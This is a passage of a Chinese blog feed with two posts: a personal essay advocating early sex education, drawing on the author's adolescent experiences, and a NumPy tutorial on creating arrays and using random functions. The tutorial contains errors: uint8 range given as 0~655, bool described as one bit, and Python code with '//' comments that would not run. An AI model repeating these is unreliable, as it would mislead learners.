        <content type="html"><![CDATA[<h2 id="丰满的人格需要性教育"><a href="#丰满的人格需要性教育" class="headerlink" title="丰满的人格需要性教育"></a>丰满的人格需要性教育</h2><p>谈性色变在中国是很常见的现象，这一现象在中学时代尤为突出。高三的时候，迫于备考的压力，有位同学提出了“十月我不撸”的禁欲活动，他认为禁欲有助于提高注意力，碍于从小缺乏性教育，我们普遍认同了他的想法。遗憾的是大家都没有挺过一个月，纷纷阵亡。从这一件事情上可以反映出，性需求是同吃饭喝水一样稀松平常的事情。但是大家在搞这个活动时，是偷偷摸摸的在搞，都有着一副如果被人发现了那就无地自容的面孔，十分谨慎。纸终究包不住火，在最后一个人阵亡后，一个和我们关系很好的女同学得知了我们在搞这件事，脸色巨变，神情愕然。在她的印象中，我们应该是风度翩翩的君子，不应该做这些龌龊猥琐之事。在她的思想里，自慰是猥琐的。</p><p>中学时代，但凡在公共场合提到有关性方面的知识，大家都会刻意回避，连初中生物老师居然都会有意的避开性器官的章节，只说让大家自己看看就好。由此可窥见，我国的教育体系中，性教育是严重缺乏的。而性教育的缺乏，会引起一系列的问题。首当其冲的，便是人格的缺陷。</p><h3 id="回避型人格与讨好型人格"><a href="#回避型人格与讨好型人格" class="headerlink" title="回避型人格与讨好型人格"></a>回避型人格与讨好型人格</h3><p>许多学者认为，有回避型人格障碍的人所具有的羞耻感，是由于童年时期的内心经历和父母的训斥造成的。从这一角度去解释为什么缺乏性教育的孩子长大后会有社交障碍，就十分恰当了。以我自身经历来举例。我的父母非常保守，他们从来不会当着我的面去谈有关性的事，我在童年时代也会经常询问父母自己从哪里来，但得到的回答无一例外都是从垃圾桶捡来的，以至于在此后很长的一段时间里，我都坚信自己的生命是垃圾桶赋予的。后来在中学时代，父母才放开了一点点，同我说只要两个人在床上睡上一段时间妈妈就会怀上宝宝。那时我已经12岁了，之前上网时接触过小电影，看到过亲吻的场景，再结合父母这勉强的解释，直到16岁我还以为，只要接吻就会怀孕。这种对性的朦胧感，使我无法正确认识自己更无法正确认识异性，所以在同女生说话时，总会用喝水来掩饰内心的惶恐。最后的最后，与自己接触过的女生都会给自己扣上一顶“不会聊天”的帽子，但其实我的内心是极其渴望和女生交往的，久而久之，一种社交上的自卑感就会产生。而自卑是一种连锁反应，哪怕只要有一方面自卑，如果不及时走出来，自己的许多方面都会受到影响，整个人就会变得抑郁寡欢。</p><p>再举一个例子。我在初中时最喜欢看的小电影通常都是师生类的，因为老师代表权威，而征服了老师便代表征服了权威。所以在那个时候，自己意淫的对象就是任课老师。但从来没有人和自己讲过这种心理和行为是否正常，所以我一直认为自己是个心理扭曲的变态，这就会让我在与人交往中，看扁自己，抬高别人，从而产生讨好型人格。好在大学时选了性教育的课程，了解到了这是一种正常的心理现象，便释然了许多。</p><h3 id="缺乏性教育的社会危害"><a href="#缺乏性教育的社会危害" class="headerlink" title="缺乏性教育的社会危害"></a>缺乏性教育的社会危害</h3><p>人格的缺陷往往会导致危害社会的行为，性侵行为就是其中之一。性侵者不会顾及被侵犯的人的感受，单纯只是为了满足自己的兽欲。而这一行径的主要起因，便有关于性意识的淡薄。没有接受过正确的性教育，自然就会把他人物化，把人变成一种手段来满足自己的需求。日本的性教育做的就很成功。在日本针对孩子做性教育工作的时候，大多数都是秉持着从小就开始普及性知识的态度，而做普及性知识的不仅有学校的老师，还有很多孩子的父母也会参与其中。而且性教育在日本并不只是，单纯的作为科普作用，而是作为科目要从小学一直学到高中。高中毕业，还会有合法的成人产业满足大家的性需求。在这个完善的性教育体系下，日本的性侵案件显著减少。</p><h3 id="性教育应该从0岁开始"><a href="#性教育应该从0岁开始" class="headerlink" title="性教育应该从0岁开始"></a>性教育应该从0岁开始</h3><p>参考日本的性教育体系，我认为从小对孩子进行性知识的科普，是必要的。那从什么时候开始呢？这个问题很有趣，问这个问题就等同于在问孩子多大才开始教他待人接物的礼貌。其实这些生活技能，待人接物的态度，或是处事的方式，从孩子出生起我们就会教授，只是看孩子的成长阶段和理解能力，再决定教什么和怎样教。就像孩子开始懂得说话，别人送他礼物要说多谢，见到别人要打招呼。同样的，性教育从0岁就应该开始了，因为从自身经历来看，孩子很早的时候就会有性意识，对好多事，甚至性都会产生好奇。只要我们配合着孩子的成长阶段和理解能力，进行性教育就可以了。</p><h3 id="什么是性教育"><a href="#什么是性教育" class="headerlink" title="什么是性教育"></a>什么是性教育</h3><p>在谈我对家庭性教育的规划之前，首先要解释清楚什么是性教育。第一，性教育，不只是性知识传授。诚然，我们要教性知识，但其实性教育是以性知识为基础，教导孩子建立正确的性态度和正确的性价值观。让孩子明白性是健康和自然的，更加接纳和肯定自己，对建立他的自我形象以及将来成长中遇到的不同情况都有很大帮助。第二，性教育是自洽教育，教导人们去接纳自己，学习与人相处的态度和技巧。第三，性教育是品格教育。孩子有了知识后，可以作出尊重别人和自己，双方都有共识的选择。第四，性教育是爱的教育。因为正确的性教育能够帮助孩子接纳自己，欣赏自己，以及最重要的爱自己！未来他们拥有任何一段亲密关系时，都能够在爱自己之余爱和欣赏别人。第五，性教育是一个生命的教育。是教一个人怎样成为一个“人”，怎样成为一个好人。</p><h3 id="浅谈我对家庭性教育的规划"><a href="#浅谈我对家庭性教育的规划" class="headerlink" title="浅谈我对家庭性教育的规划"></a>浅谈我对家庭性教育的规划</h3><p>家庭性教育离不开以下三个大方向：</p><ul><li>确立性态度</li><li>充实自己的性知识</li><li>把性教育生活化</li></ul><h4 id="确立性态度"><a href="#确立性态度" class="headerlink" title="确立性态度"></a>确立性态度</h4><p>这不单单是跟孩子说他的性态度要怎么样，还要注意自己究竟是对性采取开放态度去面对，还是采取沉默的态度去面对。作为家长自己对于性的态度，会直接影响孩子对性的看法。所以作为家长，要开放自己，接纳孩子的性好奇和性需要。坦诚和孩子沟通，鼓励孩子对性有疑惑和问题时可以和自己一起讨论。</p><h4 id="充实自己的性知识"><a href="#充实自己的性知识" class="headerlink" title="充实自己的性知识"></a>充实自己的性知识</h4><p>作为家长，我们都是在缺乏性教育的环境下成长。所以我们都可能缺乏正确的性知识。作为家长，要主动去探索，主动探求正确的性知识。厘清自己对于性的一些误解、偏见和谬误。不懂不要紧，不懂时可以和小孩一起寻找答案，切勿不懂装懂！作为家长，最重要的是有一份承载那份好奇的开放态度，让孩子提出问题。懂的话就可以及时解答，不懂就一起找答案。</p><h4 id="把性教育生活化"><a href="#把性教育生活化" class="headerlink" title="把性教育生活化"></a>把性教育生活化</h4><p>这一点是很重要的！我们不妨留意身边发生的事情，把握机会，引导小孩发问和一起思考，这不但可以锻炼孩子的分析力和观察力，还可以让他学会说不，拒绝别人。</p><p><strong>最后，一定要让孩子意识到，性不是羞耻的，性是可以讨论的，性是健康的。</strong></p><p>参考文献：</p><blockquote><p>[1] <a href="https://www.youtube.com/channel/UCcbDSi-oT_2LEYAIL_4VPZA">Sallys Toy</a>.幾歲開始性教育？性教育是什麼？家長怎樣做？｜親子性教育｜Sally’s Toy[J].Youtube，2020.</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人生 </tag>
            
            <tag> 论文 </tag>
            
            <tag> 性教育 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python数据分析(二)-数值计算(一)</title>
      <link href="/2021/05/25/python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-%E4%BA%8C/"/>
      <url>/2021/05/25/python%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="Numpy数值计算"><a href="#Numpy数值计算" class="headerlink" title="Numpy数值计算"></a>Numpy数值计算</h2><h3 id="Numpy多维数组"><a href="#Numpy多维数组" class="headerlink" title="Numpy多维数组"></a>Numpy多维数组</h3><p>Numpy提供了一个名为ndarray的多维数组对象，该数组元素具有固定大小，即Numpy数组元素是同质的，只能存放同一种数据类型的对象，因此能够确定存储数组所需空间的大小，能够运用向量化运算来处理整个数组，具有较高的运算效率。</p><h4 id="数组创建"><a href="#数组创建" class="headerlink" title="数组创建"></a>数组创建</h4><p>可以通过多种方法创建Numpy数组</p><h5 id="1-通过array-函数创建ndarray数组"><a href="#1-通过array-函数创建ndarray数组" class="headerlink" title="1.通过array()函数创建ndarray数组"></a>1.通过array()函数创建ndarray数组</h5><ul><li>Numpy的array()函数可以创建ndarray数组，对于多维数组的创建、使用嵌套序列数据即可完成。array()函数可以将Python的列表、元组、数组或其他序列类型作为参数创建ndarray数组。</li></ul><p>①一维列表作为array参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a1 = np.array([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>])<br>print(a1)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210525161850459.png"></p><p>②二维列表作为array参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a2 = np.array([[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]])<br>print(a2)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210525162117371.png"></p><p>③字符串作为array参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a3 = np.array(<span class="hljs-string">&#x27;abcdefg&#x27;</span>)<br>a3<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210525162835895.png"></p><p>④元组作为array参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a4 = np.array((<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))<br>a4<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210525163010567.png"></p><p>⑤字典作为array参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a5 = np.array(&#123;<span class="hljs-string">&#x27;zhang&#x27;</span>:<span class="hljs-number">12</span>,<span class="hljs-string">&#x27;dd&#x27;</span>:<span class="hljs-number">45</span>&#125;)<br>a5<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210525163155922.png"></p><h5 id="2-创建特殊数组"><a href="#2-创建特殊数组" class="headerlink" title="2.创建特殊数组"></a>2.创建特殊数组</h5><ul><li><p>Numpy提供了创建特殊数组的函数，如表所示</p><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">ones()</td><td align="center">创建指定长度或形状的全1数组</td></tr><tr><td align="center">ones_like()</td><td align="center">以另一个数组为参考，根据其形状和dtype创建全1数组</td></tr><tr><td align="center">zeros\zeros_like()</td><td align="center">类似于ones/ones_like，创建全零数组</td></tr><tr><td align="center">empty\empty_like()</td><td align="center">同上，创建没有具体值的数组</td></tr><tr><td align="center">eye\identity()</td><td align="center">创建正方形的N*N单位矩阵</td></tr></tbody></table><p>示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>b1 = np.empty((<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))<br>print(<span class="hljs-string">&#x27;b1=&#x27;</span>)<br>print(b1)<br>b2 = np.zeros((<span class="hljs-number">3</span>,<span class="hljs-number">5</span>))<br>print(<span class="hljs-string">&#x27;b2=&#x27;</span>)<br>print(b2)<br>b3 = np.ones((<span class="hljs-number">4</span>,<span class="hljs-number">2</span>))<br>print(<span class="hljs-string">&#x27;b3=&#x27;</span>)<br>print(b3)<br>b4 = np.eye(<span class="hljs-number">3</span>)<br>print(<span class="hljs-string">&#x27;b4=&#x27;</span>)<br>print(b4)<br>b5 = np.ones_like(b1)<br>print(<span class="hljs-string">&#x27;b2=&#x27;</span>)<br>print(b5)<br></code></pre></td></tr></table></figure><p>输出结果：</p><p><img src="/images/JavaScript/image-20210525164130624.png"></p></li></ul><h5 id="3-从数值范围创建数组"><a href="#3-从数值范围创建数组" class="headerlink" title="3.从数值范围创建数组"></a>3.从数值范围创建数组</h5><p>从数值范围创建数组的Numpy函数有三个：arange()\linspace()和logspace()。</p><ul><li><ol><li>arange()函数：</li></ol><p>函数arange()根据start指定的范围以及step设置的步长，生成一个ndarry对象，函数格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">numpy.arange(start,stop,step,dtype)<br></code></pre></td></tr></table></figure><p>其中的参数如表所示：</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">start</td><td align="center">起始值，默认为0</td></tr><tr><td align="center">stop</td><td align="center">终止值(不包含)</td></tr><tr><td align="center">step</td><td align="center">步长，默认为1</td></tr><tr><td align="center">dtype</td><td align="center">返回的ndarray的数据类型，如果没有提供，则会使用输入数据的类型</td></tr></tbody></table></li><li><ol start="2"><li>linspace()函数</li></ol><p>Linspace()函数用于创建一个一维数组，数组是一个等差数列构成的，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">np.linspace(start,stop,num=<span class="hljs-number">50</span>,endpoint=<span class="hljs-literal">True</span>,retstep=<span class="hljs-literal">False</span>,dtype=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><p>其中参数如表所示</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">start</td><td align="center">起始值，默认为0</td></tr><tr><td align="center">stop</td><td align="center">序列的终止值，如果endpoint为True，该值包含于数列中</td></tr><tr><td align="center">num</td><td align="center">要生成的等步长的样本数量，默认为50</td></tr><tr><td align="center">dtype</td><td align="center">ndarray的数据类型</td></tr><tr><td align="center">endpoint</td><td align="center">该值为True时，数列中包含stop值，反之不包含，默认为True</td></tr><tr><td align="center">retstep</td><td align="center">如果为True，生成的数组中会显示间距，反之不显示</td></tr></tbody></table></li><li><ol start="3"><li><p>logspace()函数</p><p>logspace()函数用于创建一个对数运算的等比数列，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">np.logspace(start,stop,num=<span class="hljs-number">50</span>,endpoint=<span class="hljs-literal">True</span>,base=<span class="hljs-number">10.0</span>,dtype=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">start</td><td align="center">起始值，默认为0</td></tr><tr><td align="center">stop</td><td align="center">序列的终止值，如果endpoint为True，该值包含于数列中</td></tr><tr><td align="center">num</td><td align="center">要生成的等步长的样本数量，默认为50</td></tr><tr><td align="center">dtype</td><td align="center">ndarray的数据类型</td></tr><tr><td align="center">endpoint</td><td align="center">该值为True时，数列中包含stop值，反之不包含，默认为True</td></tr><tr><td align="center">base</td><td align="center">对数log的底数</td></tr></tbody></table><p>实例：从数值范围创建数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>c1 = np.arange(<span class="hljs-number">10</span>)<br>c2 = np.linspace(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">10</span>)<br>c3 = np.logspace(<span class="hljs-number">10</span>,<span class="hljs-number">100</span>,<span class="hljs-number">10</span>)<br>print(<span class="hljs-string">&#x27;c1=&#x27;</span>,c1)<br>print(<span class="hljs-string">&#x27;c2=&#x27;</span>,c2)<br>print(<span class="hljs-string">&#x27;c3=&#x27;</span>,c3)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210525190435736.png"></p></li></ol></li></ul><h5 id="4-使用asarray-函数创建Numpy数组"><a href="#4-使用asarray-函数创建Numpy数组" class="headerlink" title="4.使用asarray()函数创建Numpy数组"></a>4.使用asarray()函数创建Numpy数组</h5><p>函数asarray()把Python的列表、元组等转换为Numpy数组，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">numpy.asarray(a,dtype=<span class="hljs-literal">None</span>,order=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><p>其中参数如表所示：</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">a</td><td align="center">任意形式的输入参数，可以是列表、列表的元组、元组、元组的元组、元组的列表、多维数组</td></tr><tr><td align="center">dtype</td><td align="center">数据类型(可选)</td></tr><tr><td align="center">order</td><td align="center">可选，有C和F两个选项，分别代表行优先和列优先</td></tr></tbody></table><p>示例：asarray()函数的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>d1 = [<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>]<br>d2 = np.asarray(d1)<br>print(d2)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210525191714124.png"></p><h5 id="5-随机数数组"><a href="#5-随机数数组" class="headerlink" title="5.随机数数组"></a>5.随机数数组</h5><p>通过Numpy的随机函数可以创建随机数数数组，在numpy.random模块中，提供了多种随机生成函数，如表所示。</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">rand()</td><td align="center">产生均匀分布的样本值</td></tr><tr><td align="center">randint()</td><td align="center">给定范围内取随机整数</td></tr><tr><td align="center">randn()</td><td align="center">产生正态分布的样本值</td></tr><tr><td align="center">seed()</td><td align="center">随机数种子</td></tr><tr><td align="center">permutation()</td><td align="center">对一个序列随机排序，不改变原数组</td></tr><tr><td align="center">shuffle()</td><td align="center">对一个序列随机排序，改变原数组</td></tr><tr><td align="center">uniform(low,high,size)</td><td align="center">产生具有均匀分布的数组，low表示起始值，high表示结束值，size表示形状</td></tr><tr><td align="center">normal(loc,scale,size)</td><td align="center">产生具有正态分布的数组，loc表示均值，scale表示标准差</td></tr><tr><td align="center">poisson(lam,size)</td><td align="center">产生具有泊松分布的数组，lam表示随机事件发生率</td></tr></tbody></table><ul><li><p>rand()函数</p><p>rand()函数产生一个指定形状的数组，数组中的值服从[0,1)之间的均匀分布，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">numpy.random.rand(d0,d1,...,dn)<br></code></pre></td></tr></table></figure><p>其中，参数d0，d1，…，dn为int型，可选。如果没有参数则返回一个float型的随机数。该随机数服从[0,1]之间的均匀分布。其返回值是一个ndarray对象或者一个float型的值。</p><p>示例：rand()函数的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.random.rand(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)<br>print(a)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210525204538586.png"></p></li><li><p>uniform()函数</p><p>uniform()函数返回一个在区间[low，high)中均匀分布的数组，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">uniform(low=<span class="hljs-number">0.0</span>,high=<span class="hljs-number">1.0</span>,size=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><p>其中，参数low、high是float型或者float型的类数组对象。指定抽样区间为[low，high),low的默认值为0.0，high的默认值为1.0；size是int型或int型元组。指定形状，如果不提供size，则返回一个服从该分布的随机值。</p><p>这个读起来比较抽象，我们拿具体示例来看：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.random.uniform(size=(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>))//二行四列<br>b = np.random.uniform(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>))//二行四列<br>print(a)<br>print(b)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210525205920818.png"></p></li><li><p>randn()函数</p><p>函数randn()返回一个指定形状的数组，数组中的值服从标准正态分布(均值为0，方差为1)，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">numpy.random.randn(d0,d1,...,dn)<br></code></pre></td></tr></table></figure><p>其中，参数d0，d1，…，dn为int型，可选。如果没有参数，则返回一个服从标准正态分布的float型随机数。</p><p>返回值：ndarray对象或者float</p><p>示例：randn()函数的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.random.randn(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)<br>print(a)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210526153628490.png"></p></li><li><p>normal()函数</p><p>normal()函数生成一个由size指定形状的数组，数组中的值服从μ=loc，σ=scale的正态分布，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">numpy.random.normal(loc=<span class="hljs-number">0.0</span>,scale=<span class="hljs-number">1.0</span>,size=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><p>函数参数说明如下：</p><p>①loc：float型或者float型的类数组对象，指定均值</p><p>②scale：float型或者float型的类数组对象，指定标准差</p><p>③size：int型或者int型类元组，指定了数组的形状。如果不提供size，则loc和scale为标量（不是类数组对象），则返回一个服从该分布的随机数。</p><p>输出：ndarray对象或者一个标量</p><p>示例：normal()函数的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.random.normal(size=(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>)) //<span class="hljs-number">2</span> 行 <span class="hljs-number">4</span> 列<br>print(a)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210526154810765.png"></p></li><li><p>randint()函数</p><p>randint()函数生成一个在区间[low,high)中离散均匀抽样的数组，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">numpy.random.randint(low,high=<span class="hljs-literal">None</span>,size=<span class="hljs-literal">None</span>,dtype=<span class="hljs-string">&#x27;1&#x27;</span>)<br></code></pre></td></tr></table></figure><p>函数参数说明如下：</p><p>①low、high：int型，指定抽样区间[low，high)</p><p>②size：int型或int型元组，指定形状</p><p>③dtype：可选参数，指定数据类型，如int、int64等，默认为np.int</p><p>返回值：如果指定了size，则返回一个int型的ndarray对象，否则返回一个服从该分布的int型随机数。</p><p>示例：randint()函数的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,size=(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>))<br>print(a)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210526155734411.png"></p></li><li><p>numpy.random.random(size=None)</p><p>函数random()生成[0,1)之间均匀抽样的数组，其格式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">numpy.random.random(size=<span class="hljs-literal">None</span>)<br></code></pre></td></tr></table></figure><p>参数size：int型或者int型的元组，如果不提供则返回一个服从该分布的随机数</p><p>返回值：float型或者float型的ndarray对象</p><p>示例：random()函数的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.random.random((<span class="hljs-number">2</span>,<span class="hljs-number">4</span>))<br>print(a)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210527125405391.png"></p></li></ul><h5 id="6-数组对象属性"><a href="#6-数组对象属性" class="headerlink" title="6.数组对象属性"></a>6.数组对象属性</h5><p>ndarray对象具有多个十分有用的属性，如表所示。</p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">ndim</td><td align="center">秩，即数据轴的个数</td></tr><tr><td align="center">shape</td><td align="center">数组的维度</td></tr><tr><td align="center">size</td><td align="center">元素的总个数</td></tr><tr><td align="center">dtype</td><td align="center">数据类型</td></tr><tr><td align="center">itemsize</td><td align="center">数组中每个元素的字节大小</td></tr><tr><td align="center">nbytes</td><td align="center">存储在数组所需的字节数量，是itemsize属性值和size属性值之积</td></tr><tr><td align="center">T</td><td align="center">数组的转量</td></tr><tr><td align="center">flat</td><td align="center">返回一个numpy.flatiter对象，可以使用flat的迭代器来遍历数组</td></tr></tbody></table><p>①属性T。如果数组的秩小于2，那么所得只是一个数组的视图</p><p>②属性flat提供了一种遍历方式，同时还可以给flat属性赋值，但是赋值会覆盖整个数组内所有元素的值。</p><p>示例：random()函数的应用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>a = np.array([np.arange(<span class="hljs-number">3</span>),np.linspace(<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>)])<br>print(np.arange(<span class="hljs-number">5</span>).T) <span class="hljs-comment">#一维数组的转置为自身视图</span><br>print(<span class="hljs-string">&#x27;a=&#x27;</span>)<br>print(a)<br>print(a.ndim,a.shape,a.size,a.dtype,a.itemsize,a.nbytes)<br>print(<span class="hljs-string">&#x27;数组转置&#x27;</span>)<br>print(a.T)<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> a.flat:<br>print(item,end=<span class="hljs-string">&#x27;,&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/images/JavaScript/image-20210527131120895.png"></p><h5 id="7-数组数据类型"><a href="#7-数组数据类型" class="headerlink" title="7.数组数据类型"></a>7.数组数据类型</h5><p>Python虽然支持整型、浮点型和复数型，但对于科学计算来说，仍然需要更多的数据类型来满足在精度和存储大小方面的各种不同要求。NumPy提供了丰富的数据类型，如表所示。</p><table><thead><tr><th align="center">类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">bool</td><td align="center">布尔型(值为True或False)，占用1bit</td></tr><tr><td align="center">inti</td><td align="center">其长度取决于平台的整数(通常为int32或者int64)</td></tr><tr><td align="center">int8</td><td align="center">字节类型(取值范围为-128~127)</td></tr><tr><td align="center">int16</td><td align="center">整型(取值范围为-32768~32767)</td></tr><tr><td align="center">int32</td><td align="center">整型(取值范围为-2^31~2^31-1)</td></tr><tr><td align="center">int64</td><td align="center">整型(取值范围为-2^63~2^63-1)</td></tr><tr><td align="center">uint8</td><td align="center">无符号整型(取值范围为0~655)</td></tr><tr><td align="center">uint16</td><td align="center">无符号整型(取值范围为0~65535)</td></tr></tbody></table><table><thead><tr><th align="center">类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">uint32</td><td 